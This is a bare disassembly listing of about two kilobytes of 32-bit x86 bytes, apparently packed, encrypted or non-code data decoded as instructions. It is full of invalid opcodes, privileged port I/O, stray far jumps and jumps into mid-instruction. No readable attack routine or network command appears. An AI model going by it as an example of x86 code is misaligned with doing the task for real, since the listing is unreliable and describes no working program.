  4082e7:	push   esp
  4082e8:	adc    ebp,DWORD PTR [eax+0x18142d33]
  4082ee:	in     eax,0x94
  4082f0:	jae    0x408332
  4082f2:	mov    fs,WORD PTR [esi]
  4082f4:	push   edi
  4082f5:	jno    0x4082e3
  4082f7:	iret   
  4082f8:	jp     0x2a375d1
  4082fe:	fldenv [ebx-0x1ec67dfc]
  408304:	call   0xaa2294eb
  408309:	(bad)  
  40830a:	pop    esp
  40830b:	add    eax,0x4c5d4883
  408310:	addr16 out dx,eax
  408312:	rcr    esi,cl
  408314:	sbb    eax,0xd5f49248
  408319:	or     bl,BYTE PTR [edx+0x59]
  40831c:	cwde   
  40831d:	out    dx,eax
  40831e:	sbb    eax,0x1e0f1520
  408323:	mov    ebx,0xc2dfd77f
  408328:	pop    ebx
  408329:	repnz loop 0x4082ad
  40832c:	dec    esi
  40832d:	xchg   DWORD PTR [eax+0x20],esp
  408330:	shl    BYTE PTR [ecx-0x8cb2dd5],0x5b
  408337:	cmp    eax,0xd42df4ca
  40833c:	push   ds
  40833d:	pop    esp
  40833e:	sbb    BYTE PTR [eax+eax*4],bl
  408341:	jp     0x408383
  408343:	mov    esi,0x5f269564
  408348:	ds xor al,0xbd
  40834b:	addr16 mov edx,0x85d3b0f0
  408351:	sub    cl,ah
  408353:	pop    ss
  408354:	push   cs
  408355:	push   ebp
  408356:	push   edi
  408357:	mov    edx,0x1a834249
  40835c:	inc    eax
  40835d:	xchg   edx,eax
  40835e:	cmp    BYTE PTR [eax+eax*1],0xbd
  408362:	jecxz  0x408305
  408364:	fimul  DWORD PTR [edi]
  408366:	lods   al,BYTE PTR ds:[esi]
  408367:	dec    edx
  408368:	jo     0x408301
  40836a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40836b:	mov    ds:0x6d9bc627,eax
  408370:	imul   ebx,esi,0xfffffffd
  408373:	jo     0x40830f
  408375:	cli    
  408376:	(bad)  
  408377:	and    ecx,esi
  408379:	stos   DWORD PTR es:[edi],eax
  40837a:	daa    
  40837b:	xchg   ecx,ebx
  40837d:	imul   DWORD PTR [edx-0x6e]
  408380:	hlt    
  408381:	xor    eax,0xc2f74cd4
  408386:	jmp    0x408367
  408388:	push   edx
  408389:	jbe    0x4083f5
  40838b:	xlat   BYTE PTR ds:[ebx]
  40838c:	enter  0x76e8,0x4a
  408390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408391:	push   DWORD PTR ds:0xc2ded812
  408397:	pop    ss
  408398:	push   0x3a
  40839a:	mov    dl,0xca
  40839c:	daa    
  40839d:	gs jp  0x408400
  4083a0:	mov    esi,0x7fe220c8
  4083a5:	test   cl,cl
  4083a7:	xchg   ebx,eax
  4083a8:	push   esi
  4083a9:	adc    DWORD PTR [ebx+0x4040d933],0x17
  4083b0:	(bad)  
  4083b1:	xor    eax,0xf8e5ff51
  4083b6:	ins    BYTE PTR es:[edi],dx
  4083b7:	sub    BYTE PTR [edi-0x7a9b9ded],bl
  4083bd:	fwait
  4083be:	xor    eax,0x1fb342d8
  4083c3:	inc    ecx
  4083c4:	adc    eax,0x7fc763a9
  4083c9:	in     eax,0x68
  4083cb:	xor    eax,0x104aba5e
  4083d0:	mov    bl,0x82
  4083d2:	clc    
  4083d3:	push   ss
  4083d4:	dec    esi
  4083d5:	sbb    BYTE PTR [eax+eiz*8-0x1b],bh
  4083d9:	stc    
  4083da:	enter  0xd87f,0x4d
  4083de:	mov    al,0xa0
  4083e0:	call   0x734d:0xe9dbed39
  4083e7:	in     eax,0x3a
  4083e9:	jmp    0xf0a4:0x78e62dc2
  4083f0:	pop    ss
  4083f1:	sar    esp,1
  4083f3:	neg    DWORD PTR [esi-0x6]
  4083f6:	in     al,dx
  4083f7:	test   DWORD PTR [edi+0x60],ebx
  4083fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083fb:	js     0x4083c4
  4083fd:	mov    fs,WORD PTR [edi-0x23b2631b]
  408403:	mov    bl,0xad
  408405:	inc    esp
  408406:	cdq    
  408407:	sub    ebp,DWORD PTR [ecx]
  408409:	lods   eax,DWORD PTR ds:[esi]
  40840a:	in     al,dx
  40840b:	mov    ebx,0x7c9f71af
  408410:	ret    
  408411:	mov    ebp,0x3d197c60
  408416:	and    ebx,DWORD PTR [ebx+0x1]
  408419:	je     0x408491
  40841b:	popa   
  40841c:	mov    ecx,DWORD PTR [eax]
  40841e:	cmp    BYTE PTR [eax],dh
  408420:	xchg   edx,eax
  408421:	repnz shl DWORD PTR [ecx-0x43],1
  408425:	pop    edi
  408426:	scas   eax,DWORD PTR es:[edi]
  408427:	cwde   
  408428:	and    eax,0xf179b317
  40842d:	mov    bh,0x45
  40842f:	add    BYTE PTR ds:0xb7a11dde,0x3a
  408436:	xchg   DWORD PTR [esi+0x3f],ecx
  408439:	in     eax,dx
  40843a:	and    eax,DWORD PTR [ebp-0x35]
  40843d:	cmp    DWORD PTR [ecx+0x5],ebp
  408440:	add    al,0xfa
  408442:	xor    eax,0xeb6a1926
  408447:	test   BYTE PTR [esi],bl
  408449:	pop    ebp
  40844a:	aas    
  40844b:	ins    DWORD PTR es:[edi],dx
  40844c:	sti    
  40844d:	(bad)  
  40844e:	sub    BYTE PTR [esi-0xe],bh
  408451:	xor    eax,0xb8c3fa65
  408456:	sbb    DWORD PTR [edx-0x43795f52],ecx
  40845c:	inc    edx
  40845d:	loop   0x4083f5
  40845f:	(bad)  
  408460:	xchg   dh,bh
  408462:	mov    gs,WORD PTR [esi]
  408464:	(bad)  
  408465:	jnp    0x4084a5
  408467:	scas   al,BYTE PTR es:[edi]
  408468:	test   eax,0x6787e21a
  40846d:	inc    ebp
  40846e:	das    
  40846f:	mov    eax,ds:0x355456ea
  408474:	lds    esi,FWORD PTR [edi+edi*2+0x20]
  408478:	dec    ebx
  408479:	(bad)
  40847c:	fwait
  40847d:	mov    ah,0x97
  40847f:	fwait
  408480:	daa    
  408481:	clc    
  408482:	fcmovne st,st(5)
  408484:	mov    esp,0x14ec4b24
  408489:	push   ds
  40848a:	in     eax,0xee
  40848c:	pop    ecx
  40848d:	std    
  40848e:	stc    
  40848f:	in     eax,dx
  408490:	out    dx,al
  408491:	mov    ebp,0x75d5189a
  408496:	mov    dl,0x8e
  408498:	xor    eax,0x501ee213
  40849d:	add    bh,BYTE PTR [eax+ebp*8-0x53c6cf41]
  4084a4:	xlat   BYTE PTR ds:[ebx]
  4084a5:	hlt    
  4084a6:	inc    ebp
  4084a7:	out    0x73,al
  4084a9:	jbe    0x408483
  4084ab:	mov    BYTE PTR [ecx],dl
  4084ad:	adc    BYTE PTR [eax-0x27],bh
  4084b0:	imul   ecx,DWORD PTR [edx],0x6d
  4084b3:	or     dh,BYTE PTR [edx-0x2ec8786d]
  4084b9:	xchg   ecx,eax
  4084ba:	lahf   
  4084bb:	mov    ecx,0x46eb8b7f
  4084c0:	push   0xb974d1ce
  4084c5:	lds    esi,FWORD PTR [esi-0x2c]
  4084c8:	xor    eax,0x7bb134d
  4084cd:	add    al,0xad
  4084cf:	jmp    DWORD PTR [esi-0x19]
  4084d2:	shl    ebx,1
  4084d4:	(bad)  [ecx-0x6dfdca84]
  4084da:	or     ch,ah
  4084dc:	sbb    eax,0xc460c8db
  4084e1:	shr    DWORD PTR [ecx+ecx*1],0xd
  4084e5:	xchg   dh,dl
  4084e7:	adc    al,0x6b
  4084e9:	mov    ebp,0x8323d837
  4084ee:	jbe    0x408514
  4084f0:	pop    ebp
  4084f1:	add    ebp,DWORD PTR [eax-0x78]
  4084f4:	mov    esp,0x5d4199f
  4084f9:	sbb    al,0xe8
  4084fb:	sbb    eax,0x4fe6147b
  408500:	and    bl,dh
  408502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408503:	xchg   esi,eax
  408505:	cmp    BYTE PTR [ebp+0x5b],0x2a
  408509:	push   cs
  40850a:	icebp  
  40850b:	icebp  
  40850c:	cs or  eax,0xac0dbb62
  408512:	int3   
  408513:	ret    
  408514:	fldcw  WORD PTR [edi-0x20]
  408517:	mov    esp,0xe923d28a
  40851c:	add    esi,ebx
  40851e:	and    ebx,0x52
  408521:	addr16 mov ecx,fs
  408524:	(bad)  
  408525:	xor    DWORD PTR [edx],edi
  408527:	js     0x4084f7
  408529:	sbb    edi,DWORD PTR [edi+0x7424dff3]
  40852f:	push   es
  408530:	adc    eax,0x24fd0d99
  408535:	sub    esp,edi
  408537:	or     BYTE PTR [ecx+0x5d0d9508],dh
  40853d:	fdiv   DWORD PTR [ecx-0x40]
  408540:	lds    ebx,FWORD PTR [edx+0x41c5a6c9]
  408546:	in     al,dx
  408547:	into   
  408548:	push   ss
  408549:	inc    ecx
  40854a:	or     bh,BYTE PTR [ebx]
  40854c:	xor    al,bh
  40854e:	pop    ebx
  40854f:	test   al,0xbd
  408551:	pop    esp
  408552:	xchg   DWORD PTR [edx+0x622d5ae],edi
  408558:	arpl   WORD PTR [ecx+0x14],bp
  40855b:	scas   eax,DWORD PTR es:[edi]
  40855c:	push   esi
  40855d:	mov    edi,eax
  40855f:	cmp    eax,0x4856f571
  408564:	in     al,dx
  408565:	scas   eax,DWORD PTR es:[edi]
  408566:	jg     0x40859b
  408568:	inc    ebp
  408569:	cs inc ebx
  40856b:	rcr    DWORD PTR [ebp+edi*8+0xb4ba82b],0xf2
  408573:	push   edx
  408574:	out    0x35,al
  408576:	cdq    
  408577:	test   al,0x57
  408579:	sbb    eax,0xeca7ded1
  40857e:	jecxz  0x408529
  408580:	cmp    DWORD PTR [ecx+edi*8+0x33],edi
  408584:	clc    
  408585:	push   ds
  408586:	xor    al,0x6d
  408588:	push   edx
  408589:	rcr    DWORD PTR [ecx+0x71],0xb1
  40858d:	outs   dx,DWORD PTR ds:[esi]
  40858e:	ins    BYTE PTR es:[edi],dx
  40858f:	jae    0x4085c3
  408591:	ret    0xeb16
  408594:	scas   al,BYTE PTR es:[edi]
  408595:	mov    dl,0xf5
  408597:	push   eax
  408598:	daa    
  408599:	scas   al,BYTE PTR es:[edi]
  40859a:	pushf  
  40859b:	xor    DWORD PTR [ebp+ecx*1-0x3e],0xffffffde
  4085a0:	ja     0x408540
  4085a2:	enter  0xf02a,0xee
  4085a6:	test   eax,0xc9120213
  4085ab:	mov    al,0xc0
  4085ad:	pop    ss
  4085ae:	adc    al,0x6c
  4085b0:	inc    esp
  4085b1:	aaa    
  4085b2:	call   0xda361270
  4085b7:	jp     0x4085e5
  4085b9:	sahf   
  4085ba:	sub    bh,cl
  4085bc:	sbb    BYTE PTR [ebp+0x4c849ae9],dh
  4085c2:	mov    al,fs:0x17c0f60a
  4085c8:	(bad)  
  4085c9:	shl    DWORD PTR [edi-0xc114871],cl
  4085cf:	pop    ecx
  4085d0:	(bad)  
  4085d1:	push   ecx
  4085d2:	push   0x8a42b65d
  4085d7:	stos   BYTE PTR es:[edi],al
  4085d8:	mov    cl,bl
  4085da:	or     eax,0xae3b3966
  4085e0:	inc    eax
  4085e1:	adc    al,0x16
  4085e3:	stos   DWORD PTR es:[edi],eax
  4085e4:	cmp    ecx,esp
  4085e6:	imul   eax,esp,0x4b
  4085e9:	shl    DWORD PTR gs:[ecx-0x218b4679],cl
  4085f0:	out    0xaa,eax
  4085f2:	cld    
  4085f3:	ins    DWORD PTR es:[edi],dx
  4085f4:	mov    WORD PTR [edi],ds
  4085f6:	fistp  WORD PTR [edx]
  4085f8:	inc    ecx
  4085f9:	iret   
  4085fa:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4085fc:	repz mov al,0xc5
  4085ff:	js     0x4085a0
  408601:	push   esi
  408602:	or     dh,BYTE PTR [edx-0x56abda2b]
  408608:	hlt    
  408609:	cwde   
  40860a:	jl     0x408646
  40860c:	std    
  40860d:	test   DWORD PTR [edi],ebp
  40860f:	mov    ds:0xe14fe84,eax
  408614:	or     cl,BYTE PTR [edi-0x5a47e73f]
  40861a:	dec    ebx
  40861b:	(bad)  
  40861c:	jp     0x40862d
  40861e:	out    0xd2,eax
  408620:	cmp    ah,BYTE PTR [edi]
  408622:	pushf  
  408623:	fdiv   DWORD PTR [edi-0x20]
  408626:	push   es
  408627:	shl    DWORD PTR [esi],1
  408629:	mov    DWORD PTR [esi],0xce269dd1
  40862f:	fsub   DWORD PTR [ebx+0x33]
  408632:	int3   
  408633:	mov    ebp,0x7cda2c90
  408638:	js     0x408661
  40863a:	inc    ebp
  40863b:	cld    
  40863c:	xlat   BYTE PTR ds:[ebx]
  40863d:	ins    BYTE PTR es:[edi],dx
  40863e:	inc    esi
  40863f:	int    0x77
  408641:	(bad)  
  408642:	jg     0x408637
  408644:	into   
  408645:	sub    edx,DWORD PTR [ecx-0x66]
  408648:	pop    eax
  408649:	rol    BYTE PTR cs:[edi],cl
  40864c:	pushf  
  40864d:	adc    eax,0x8568d3eb
  408652:	add    edi,DWORD PTR ds:0xb58edb3f
  408658:	sbb    esp,eax
  40865a:	xor    ecx,DWORD PTR ds:[edi+0x71]
  40865e:	in     al,0x1f
  408660:	inc    edi
  408662:	in     al,dx
  408663:	pop    ebx
  408664:	xchg   esi,eax
  408665:	les    ebp,FWORD PTR [ebx-0x22c3be9e]
  40866b:	rcr    BYTE PTR [edx],cl
  40866d:	repz (bad) 
  40866f:	jb     0x4086cb
  408671:	mov    ah,0xca
  408673:	jg     0x408676
  408675:	jnp    0x4086b5
  408677:	mov    edi,0x611209ea
  40867c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40867d:	std    
  40867e:	stc    
  40867f:	pop    edi
  408680:	inc    esp
  408681:	lock aam 0x7e
  408684:	ja     0x408677
  408686:	adc    esp,ecx
  408688:	shr    ecx,0x67
  40868b:	xchg   edi,eax
  40868c:	mov    ah,0x83
  40868e:	ret    0x8b95
  408691:	fwait
  408692:	adc    eax,0x359794a0
  408697:	dec    edx
  408698:	ror    DWORD PTR [eax*2-0x3184bc1f],1
  40869f:	out    0x1,eax
  4086a1:	mov    esi,0x19f1d13
  4086a6:	ror    DWORD PTR [ebp-0x6e],1
  4086a9:	fldenv [ecx+0x24521834]
  4086af:	ror    DWORD PTR [ebp-0x57739de5],cl
  4086b5:	push   ebp
  4086b6:	sub    ebx,DWORD PTR [esi]
  4086b8:	js     0x408680
  4086ba:	mov    al,ds:0xf36d4d69
  4086bf:	dec    eax
  4086c0:	mov    esp,DWORD PTR [edx-0x549ca45d]
  4086c6:	and    ebx,DWORD PTR [edi]
  4086c8:	or     ah,BYTE PTR [ebx-0x49985222]
  4086ce:	fidivr DWORD PTR [edx-0x624ab0fc]
  4086d4:	aam    0x84
  4086d6:	or     eax,0x7594d581
  4086db:	mov    ds:0xcc8af9d9,eax
  4086e0:	js     0x408664
  4086e2:	sbb    eax,0x325dfb97
  4086e7:	test   al,0xf5
  4086e9:	nop
  4086ea:	daa    
  4086eb:	and    edi,DWORD PTR [edi+0x12]
  4086ee:	mov    WORD PTR [edx-0x5b],?
  4086f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f2:	leave  
  4086f3:	imul   edx,DWORD PTR [ebp+0x6c8dd61d],0x7c7ebf2c
  4086fd:	push   esp
  4086fe:	sar    DWORD PTR [edx+0x4a],0x34
  408702:	adc    edi,edi
  408704:	retf   
  408705:	and    eax,0x873fb130
  40870a:	inc    ebx
  40870b:	dec    esi
  40870c:	sbb    BYTE PTR [ecx],0xa
  40870f:	sbb    DWORD PTR [eax-0x4777579d],edx
  408715:	sub    ch,dh
  408717:	inc    edx
  408718:	or     eax,0xa5e37865
  40871d:	pop    ds
  40871e:	pop    edx
  40871f:	jbe    0x40874e
  408721:	mov    cl,0xf0
  408723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408724:	mov    eax,0x52660c42
  408729:	neg    DWORD PTR [ebx+0x2be1194d]
  40872f:	mov    ch,bl
  408731:	and    ah,BYTE PTR [esi-0x93cc10b]
  408737:	nop
  408738:	fwait
  408739:	mov    eax,0x408759b2
  40873e:	pop    ss
  40873f:	std    
  408740:	test   BYTE PTR [esi+0x56839333],0x71
  408747:	out    0xa7,eax
  408749:	pop    ebx
  40874a:	pop    ss
  40874b:	mov    eax,DWORD PTR [ebp+0x1068625c]
  408751:	push   es
  408752:	xor    al,BYTE PTR [esi-0xb055ea0]
  408758:	and    BYTE PTR [ebp+0x3fa67353],0x4f
  40875f:	fidiv  WORD PTR [edx+0x6ebe73f1]
  408765:	pusha  
  408766:	push   ebp
  408767:	out    dx,al
  408768:	cmc    
  408769:	jb     0x40873b
  40876b:	dec    ebp
  40876c:	mov    ah,0x1a
  40876e:	fild   DWORD PTR [ebp+0x7fe21c64]
  408774:	fwait
  408775:	mov    esi,0xd57cf60a
  40877a:	lods   eax,DWORD PTR ds:[esi]
  40877b:	xchg   edx,eax
  40877c:	iret   
  40877d:	imul   eax,DWORD PTR [ebp-0x3c],0x57
  408781:	push   es
  408782:	jne    0x408714
  408784:	jnp    0x4087e4
  408786:	sub    DWORD PTR [edx-0x6c],0xfffffffb
  40878a:	mov    dl,0x94
  40878c:	(bad)  
  40878d:	fmul   DWORD PTR [esi-0x4e]
  408790:	in     eax,0x3c
  408792:	adc    BYTE PTR [edx+0x54570ade],dh
  408798:	int    0x9b
  40879a:	in     eax,0x2f
  40879c:	jmp    0xd1e9:0x5b9584f3
  4087a3:	cmp    dl,BYTE PTR [ebx-0x7b11c842]
  4087a9:	and    ah,BYTE PTR [ebp+0x2ea93fce]
  4087af:	xchg   esp,eax
  4087b0:	mov    al,0x77
  4087b2:	adc    DWORD PTR [ecx],edx
  4087b4:	xor    eax,0x20acfce8
  4087b9:	arpl   si,ax
  4087bb:	mov    ah,0xfc
  4087bd:	sbb    eax,0x665ded3
  4087c2:	pop    ebp
  4087c3:	or     BYTE PTR [edi+0x34f9639],bl
  4087c9:	ror    BYTE PTR [ebx-0x65],1
  4087cc:	adc    bh,BYTE PTR [edx+0x2f]
  4087cf:	sahf   
  4087d0:	xchg   edi,eax
  4087d1:	cmc    
  4087d2:	mov    WORD PTR [edx-0x583e0358],ds
  4087d8:	popa   
  4087d9:	mov    esp,0x4b999a86
  4087de:	xchg   ebp,eax
  4087df:	dec    esi
  4087e0:	cdq    
  4087e1:	out    0x6f,eax
  4087e3:	aaa    
  4087e4:	sub    dl,BYTE PTR [esi]
  4087e6:	ja     0x408808
  4087e8:	bound  edx,QWORD PTR [eax]
  4087ea:	ins    BYTE PTR es:[edi],dx
  4087eb:	lds    esp,FWORD PTR [esi+edi*2]
  4087ee:	les    ecx,FWORD PTR ds:0x468e0119
  4087f4:	fisttp DWORD PTR [ebx+0x885c71]
  4087fa:	fwait
  4087fb:	cld    
  4087fc:	cmp    esi,edi
  4087fe:	mov    gs,WORD PTR [edi+0x24b27879]
  408804:	or     BYTE PTR [eax+0x3cbef992],bl
  40880a:	sub    DWORD PTR ds:0x1f35089d,eax
  408810:	jo     0x4087bd
  408812:	pop    edx
  408813:	imul   ebx,DWORD PTR [ebx+edi*8],0xffffff9e
  408817:	cmp    edi,DWORD PTR [ebx]
  408819:	enter  0x64d3,0x4a
  40881d:	xor    BYTE PTR [ecx-0x7664ab23],cl
  408823:	lods   eax,DWORD PTR ds:[esi]
  408824:	fadd   QWORD PTR [ebx]
  408826:	ffree  st(2)
  408828:	add    BYTE PTR [ecx+0x5],0xf6
  40882c:	sahf   
  40882d:	xchg   DWORD PTR [eax+0x79a3d2c2],eax
  408833:	or     bl,cl
  408835:	or     ebp,DWORD PTR [eax]
  408837:	push   ebp
  408839:	and    ah,BYTE PTR [edx+0xa]
  40883c:	push   esi
  40883d:	pop    esp
  40883e:	jl     0x408801
  408840:	push   ecx
  408841:	(bad)  
  408842:	test   BYTE PTR [esi+0x79fbadd1],0xfd
  408849:	sub    ecx,DWORD PTR [ebx]
  40884b:	aad    0x99
  40884d:	sub    ebx,DWORD PTR [edx]
  40884f:	push   edx
  408850:	push   ds
  408851:	popa   
  408852:	nop
  408853:	loopne 0x40880a
  408855:	pop    ebp
  408856:	or     al,0xfd
  408858:	push   es
  408859:	jp     0x408892
  40885b:	push   ebp
  40885c:	lds    ebp,FWORD PTR [eax-0x33]
  40885f:	mov    al,0xaf
  408861:	jae    0x40889e
  408863:	(bad)  
  408864:	or     BYTE PTR [ebx+0x7302bec7],al
  40886a:	jg     0x408892
  40886c:	xchg   ebp,eax
  40886d:	and    DWORD PTR [ebp+0x19],ecx
  408870:	xchg   ebp,eax
  408871:	jmp    0x408882
  408873:	loope  0x4088cd
  408875:	aas    
  408876:	dec    ebp
  408877:	sub    BYTE PTR [ecx+0x1af13a8a],dl
  40887d:	stos   DWORD PTR es:[edi],eax
  40887e:	pusha  
  40887f:	imul   ebp,DWORD PTR [edx-0x31],0x75
  408883:	xchg   BYTE PTR [edx-0x58],bl
  408886:	stos   BYTE PTR es:[edi],al
  408887:	leave  
  408888:	adc    BYTE PTR ds:0xec1f2c4b,ch
  40888e:	mov    ebx,0x8565966
  408893:	stos   DWORD PTR es:[edi],eax
  408894:	or     eax,0x1111fd8e
  408899:	add    dl,BYTE PTR [eax+edi*8]
  40889c:	inc    edi
  40889d:	imul   edx,ecx,0x38f009d8
  4088a3:	fdivr  st(6),st
  4088a5:	sbb    al,0xa7
  4088a7:	jb     0x4088ae
  4088a9:	loop   0x408831
  4088ab:	xchg   ecx,eax
  4088ac:	cmc    
  4088ad:	cmc    
  4088ae:	rol    BYTE PTR [esi],1
  4088b0:	test   al,ch
  4088b2:	adc    al,0x8d
  4088b4:	jge    0x4088e1
  4088b6:	je     0x4088dd
  4088b8:	stos   BYTE PTR es:[edi],al
  4088b9:	inc    ebp
  4088ba:	jecxz  0x40884f
  4088bc:	jne    0x408867
  4088be:	jmp    0x408922
  4088c0:	or     DWORD PTR [esp+ecx*4],ecx
  4088c3:	fcomp  QWORD PTR [ebx]
  4088c5:	mov    ecx,0x4cea3537
  4088ca:	push   ds
  4088cb:	sub    BYTE PTR [eax],dh
  4088cd:	ins    DWORD PTR es:[edi],dx
  4088ce:	ss popf 
  4088d0:	dec    esi
  4088d1:	aad    0x3a
  4088d3:	pusha  
  4088d4:	adc    ebx,ebx
  4088d6:	and    ax,0xd958
  4088da:	call   0xc1ca:0x4636bf7f
  4088e1:	neg    BYTE PTR [ebx+0x3d]
  4088e4:	int    0xda
  4088e6:	rcl    DWORD PTR es:[eax+0x6a],0xeb
  4088eb:	push   ecx
  4088ec:	inc    ecx
  4088ed:	retf   0xc059
  4088f0:	jns    0x4088dc
  4088f2:	pusha  
  4088f3:	cmovns eax,DWORD PTR [edx-0x7fa1e63]
  4088fa:	dec    ebp
  4088fb:	leave  
  4088fc:	rcl    DWORD PTR [edx-0x61e4469e],1
  408902:	out    dx,eax
  408903:	mov    ds:0xfc634e8f,al
  408908:	ins    BYTE PTR es:[edi],dx
  408909:	imul   edx,DWORD PTR [eax+0x77587de6],0xfffffff1
  408910:	out    dx,al
  408911:	pop    ebx
  408912:	cmc    
  408913:	imul   ebp,DWORD PTR [edx],0x67
  408916:	iret   
  408917:	inc    ecx
  408918:	(bad)  
  408919:	mov    eax,0xf43b32bd
  40891e:	or     edi,DWORD PTR [esp+edi*4]
  408921:	(bad)  
  408922:	lods   eax,DWORD PTR ds:[esi]
  408923:	mov    ah,0xde
  408925:	mov    ebx,0xabf34406
  40892a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40892b:	and    esp,ebp
  40892d:	mov    ds:0xfb53b7e2,al
  408932:	loopne 0x4088d1
  408934:	mov    ebp,0xeaff37c8
  408939:	les    ebp,FWORD PTR [edx+0x47]
  40893c:	xchg   ecx,eax
  40893d:	fcom   DWORD PTR [ebp+0x7b]
  408940:	call   0xc63d65ea
  408945:	call   0x4d835181
  40894a:	imul   ecx,DWORD PTR [ecx],0xffffffb3
  40894d:	pop    ebx
  40894e:	add    al,0xc
  408950:	push   cs
  408951:	out    0xf6,eax
  408953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408954:	xchg   DWORD PTR [edi-0x55a33336],edi
  40895a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40895b:	pop    ecx
  40895c:	mov    ds:0x84fe9012,eax
  408961:	pop    ss
  408962:	cmp    cl,0x3f
  408965:	lods   eax,DWORD PTR ds:[esi]
  408966:	enter  0x5bca,0x7a
  40896a:	mov    DWORD PTR [eax],0x3be3c116
  408970:	stc    
  408971:	stos   BYTE PTR es:[edi],al
  408972:	and    bh,dl
  408974:	test   BYTE PTR [edi],ah
  408976:	je     0x40893a
  408978:	daa    
  408979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40897a:	and    al,0x75
  40897c:	dec    eax
  40897d:	push   ebx
  40897e:	(bad)  
  408980:	adc    BYTE PTR [ebx+0x2e],bh
  408983:	xchg   ebp,eax
  408984:	jnp    0x40891b
  408986:	sbb    ah,cl
  408988:	shr    BYTE PTR [eax+0x55fd898e],cl
  40898e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40898f:	dec    ebp
  408990:	mov    ds:0xc4a1611a,eax
  408995:	dec    esi
  408996:	push   ds
  408997:	jmp    0x40895c
  408999:	out    dx,eax
  40899a:	fdiv   DWORD PTR [ecx-0x4088353e]
  4089a0:	dec    edi
  4089a1:	and    BYTE PTR [eax+0x1b],0x43
  4089a5:	push   0x3f61c72
  4089aa:	mov    al,al
  4089ac:	jg     0x408975
  4089ae:	add    BYTE PTR [edi+0x5910ffa0],dh
  4089b4:	mov    edi,0x392d6145
  4089b9:	push   es
  4089ba:	cmp    eax,0x14e42c86
  4089bf:	in     eax,dx
  4089c0:	das    
  4089c1:	jmp    0x3f8e72c2
  4089c6:	nop
  4089c7:	call   0x934e:0xffcfc6f3
  4089ce:	mov    edx,0xa5f41f7
  4089d3:	fsubp  st(7),st
  4089d5:	pop    ss
  4089d6:	push   ebp
  4089d7:	cld    
  4089d8:	sub    ebp,0x6b
  4089db:	pop    esi
  4089dc:	push   0x1296d004
  4089e1:	neg    DWORD PTR [eax-0x51cfb902]
  4089e7:	push   eax
  4089e8:	xchg   esp,eax
  4089e9:	shl    DWORD PTR [ebx+0x4d8282c0],1
  4089ef:	sub    eax,0x6bf6667c
  4089f4:	push   ds
  4089f5:	xor    ah,bl
  4089f7:	into   
  4089f8:	mov    eax,0xd384cd45
  4089fd:	fild   WORD PTR [ebx-0x44]
  408a00:	push   ecx
  408a01:	retf   0xeca8
  408a04:	dec    ebp
  408a05:	add    eax,esp
  408a07:	cli    
  408a08:	push   ebp
  408a09:	ins    DWORD PTR es:[edi],dx
  408a0a:	idiv   ecx
  408a0c:	cmp    BYTE PTR [esp+ecx*4-0x46],ah
  408a10:	mov    ds:0x821973a2,eax
  408a15:	mov    ds:0xbf2aa63f,al
  408a1a:	gs jo  0x408a45
  408a1d:	das    
  408a1e:	rcl    DWORD PTR [edi],0x54
  408a21:	popa   
  408a22:	dec    ebx
  408a23:	and    al,0x4c
  408a25:	pop    edx
  408a26:	pop    ss
  408a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a28:	and    eax,DWORD PTR [eax+ebp*1-0x3231ac5c]
  408a2f:	add    eax,0x91e9e597
  408a34:	mov    bh,0x83
  408a36:	(bad)  
  408a37:	xor    al,0xee
  408a39:	or     ebx,DWORD PTR [esi-0x1eb91b0f]
  408a3f:	mov    eax,0xf080983b
  408a44:	mov    ch,0x9
  408a46:	cli    
  408a47:	stos   BYTE PTR es:[edi],al
  408a48:	fild   DWORD PTR [ebx]
  408a4a:	add    al,0x58
  408a4c:	clc    
  408a4d:	add    BYTE PTR [edi],dl
  408a4f:	inc    edi
  408a50:	call   0x43c84255
  408a55:	rcr    BYTE PTR [ecx+0xd],0x94
  408a59:	inc    edi
  408a5a:	inc    ebp
  408a5b:	jae    0x408acd
  408a5d:	sbb    BYTE PTR [ecx+0x40811be0],dh
  408a63:	scas   eax,DWORD PTR es:[edi]
  408a64:	clc    
  408a65:	pusha  
  408a66:	pushf  
  408a67:	xchg   ecx,eax
  408a68:	mov    al,BYTE PTR [ecx+0x34]
  408a6b:	cmp    DWORD PTR [ecx-0x5b],edx
  408a6e:	outs   dx,WORD PTR ds:[esi]
  408a70:	imul   esp,eax,0xb672788
  408a76:	jo     0x408a61
  408a78:	sub    ebp,eax
  408a7a:	adc    al,BYTE PTR [ebp+0x3e]
  408a7d:	lea    edi,[esi+ecx*4+0x14f731ee]
  408a84:	add    DWORD PTR [ecx-0x15],ebx
  408a87:	icebp  
  408a88:	add    al,0x73
  408a8a:	shl    BYTE PTR [edi+0x63],0xdf
  408a8e:	jne    0x408a76
  408a90:	ins    DWORD PTR es:[edi],dx
  408a91:	mov    edi,0x42773a24
  408a96:	push   esi
  408a97:	stos   BYTE PTR es:[edi],al
  408a98:	lahf   
  408a99:	push   esi
  408a9a:	not    BYTE PTR ss:[edi+0x298ed5a3]
  408aa1:	arpl   di,sp
  408aa3:	outs   dx,BYTE PTR ds:[esi]
  408aa4:	cli    
  408aa5:	bound  edx,QWORD PTR ds:0x41d1fca7
  408aab:	test   eax,0x864adaba
  408ab0:	add    BYTE PTR [eax-0x55],0x81
  408ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab5:	jae    0x408a68
  408ab7:	jl     0x408ad2
  408ab9:	mov    esp,0xbc8ad799
  408abe:	and    DWORD PTR [edx],esp
  408ac0:	outs   dx,BYTE PTR ds:[esi]
  408ac1:	and    dh,BYTE PTR cs:[edx]
  408ac4:	fimul  DWORD PTR [ebp+0x5a159cdc]
  408aca:	fild   DWORD PTR [eax]
  408acc:	xor    al,0x58
  408ace:	push   ss
  408acf:	stc    
  408ad0:	outs   dx,BYTE PTR ds:[si]
